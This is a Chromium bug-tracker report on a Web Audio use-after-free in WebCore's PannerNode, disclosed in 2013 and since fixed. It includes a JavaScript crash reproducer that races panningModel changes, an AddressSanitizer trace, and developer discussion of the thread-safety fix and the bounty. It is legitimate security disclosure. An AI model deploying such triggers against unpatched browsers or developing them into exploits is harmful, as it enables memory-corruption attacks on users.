# Use-after-free in WebCore::VectorMath::vsmul

| Field | Value |
|-------|-------|
| **Issue ID** | [40076875](https://issues.chromium.org/issues/40076875) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | at...@gmail.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2013-01-25 |
| **Bounty** | $1,000.00 |

## Description


Tested on:

OS: Ubuntu 12.04
Chromium: 26.0.1394.0 (Developer Build 178763) 

Repro-file:

<html>
<script>
var context1= new webkitAudioContext()
var BiquadFilter8=context1.createBiquadFilter();
var Oscillator1=context1.createOscillator();
var Panner3=context1.createPanner();

Panner3.connect(BiquadFilter8);
Oscillator1.connect(Panner3);
Panner3.setPosition(119,117,51);
BiquadFilter8.connect(context1.destination);

setInterval(function(){
Panner3.setPosition(358,182,358);
Panner3.panningModel=0;
Panner3.panningModel=1;
},2)

Oscillator1.start(0.8198733804747462,0.8382269653957337,0.03957605152390897)
</script>
</html>

ASAN-report:(The same repro-file causes multiple different ASAN-traces)

==11957== ERROR: AddressSanitizer: heap-use-after-free on address 0x7fa68c0dd040 at pc 0x7fa6aa5ba5f7 bp 0x7fa690f68b50 sp 0x7fa690f68b48
WRITE of size 16 at 0x7fa68c0dd040 thread T6 (AudioOutputDevic)
    #0 0x7fa6aa5ba5f6 in WebCore::VectorMath::vsmul(float const*, int, float const*, float*, int, unsigned long) ???:0
    #1 0x7fa6aa5bdf7b in WebCore::FFTFrame::doInverseFFT(float*) ???:0
    #2 0x7fa6aa7bda8d in WebCore::FFTConvolver::process(WebCore::FFTFrame*, float const*, float*, unsigned long) ???:0
    #3 0x7fa6aa7c552d in WebCore::HRTFPanner::pan(double, double, WebCore::AudioBus const*, WebCore::AudioBus*, unsigned long) ???:0
    #4 0x7fa6a7e58d37 in WebCore::PannerNode::process(unsigned long) ???:0
    #5 0x7fa6a7439d6c in WebCore::AudioNode::processIfNecessary(unsigned long) ???:0
.
.
.
freed by thread T0 (chrome) here:
    #0 0x7f5970aad832 in free ??:0
    #1 0x7f59775b0392 in WebCore::HRTFPanner::~HRTFPanner() ???:0
    #2 0x7f59775b002d in WebCore::HRTFPanner::~HRTFPanner() ???:0
    #3 0x7f5974c46f66 in WebCore::PannerNode::setPanningModel(unsigned int) ???:0
    #4 0x7f5979601820 in WebCore::V8PannerNode::panningModelAccessorSetter(v8::Local<v8::String>, v8::Local<v8::Value>, v8::AccessorInfo const&) ???:0
    #5 0x7f5977d82dff in v8::internal::StoreCallbackProperty(v8::internal::Arguments, v8::internal::Isolate*) ???:0
.
.
.


## Timeline

### in...@chromium.org (2013-01-25)

[Empty comment from Monorail migration]

### [Deleted User] (2013-01-31)

filed upstream as https://bugs.webkit.org/show_bug.cgi?id=108527

rtoy@ are you looking at this?

### pa...@chromium.org (2013-02-11)

Hey Raymond,

I'm following up on all the open high-severity security bugs since Pwnium/Pwn2Own (http://blog.chromium.org/2013/01/show-off-your-security-skills-pwn2own.html) is just around the corner (we're using M25).

Are you on this one? Otherwise we need to find a new owner quick. Thanks for any help!

### rt...@chromium.org (2013-02-11)

I am looking into this.  It may take some time to get to the bottom of
this, though.  I think it might be caused by using an object after it has
been freed.  Maybe.

### cr...@google.com (2013-02-12)

Ray, this looks like a thread safety issue in PannerNode::setPanningModel().  It looks like we need to have a mutex using a MutexTryLocker in PannerNode::process() analogous to how m_processLock is used in AudioBufferSourceNode (when m_buffer is changed)


### rt...@chromium.org (2013-02-12)

Yes, that's what I was seeing.  I'll take a look at doing it that way. (I
had made change that saved the new panner in setPanningModel and then
applied that change at the start of PannerNode::process.)

Ray

### cr...@google.com (2013-02-13)

looks like the fix landed in WebKit:
http://trac.webkit.org/changeset/142687


### sc...@gmail.com (2013-02-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-02-16)

M26: http://trac.webkit.org/changeset/143083

### sc...@gmail.com (2013-02-20)

M25: http://trac.webkit.org/changeset/143513

### sc...@gmail.com (2013-03-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-02)

$1000

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-06-24)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/172331?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076875)*
